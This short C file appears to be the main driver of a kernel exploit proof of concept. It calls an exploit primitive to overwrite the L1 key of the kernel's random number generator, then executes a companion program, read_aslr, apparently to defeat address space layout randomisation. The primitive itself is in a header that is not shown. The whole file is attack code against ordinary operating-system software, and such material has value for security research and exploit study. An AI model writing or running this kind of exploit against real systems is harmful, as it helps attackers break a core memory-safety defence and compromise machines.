#include "logging.h"
#include "libprimitive.h"
#include <stdlib.h>
#include <unistd.h>

#define PROG    "./read_aslr"

int main(int argc, char *argv[], char *envp[])
{
    char *new_argv[2]; /* new argv for execve call */

    /* Zap the l1 key of the kernel's RNG */
    log("Zapping L1 key...\n");
    trigger_overwrite_of_l1_key();

    /* Setup argv */
    new_argv[0] = PROG;
    new_argv[1] = NULL;
    /* Pass the environment through as is */

    execve(PROG, new_argv, envp);
    handle_error("execve()"); /* execve() returns only on error */
}
